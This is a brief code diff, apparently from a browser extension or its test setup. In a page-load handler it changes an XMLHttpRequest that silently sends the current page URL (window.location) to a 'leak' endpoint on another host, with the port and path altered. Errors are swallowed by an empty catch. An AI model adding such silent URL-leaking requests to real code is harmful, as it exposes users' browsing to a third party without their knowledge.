@@ -8,7 +8,7 @@ $(document).ready(function () {
         var reqA = new XMLHttpRequest();
   
         reqA.onload = function() { };
-        reqA.open("get", "http://extension.lvh.me:3000/leak?yourstatementhere"+window.location, true);
+        reqA.open("get", "http://extension.lvh.me:3001/leaking?yourstatementhere"+window.location, true);
         reqA.responseType = "json";
         reqA.send();
         } catch(e) { }
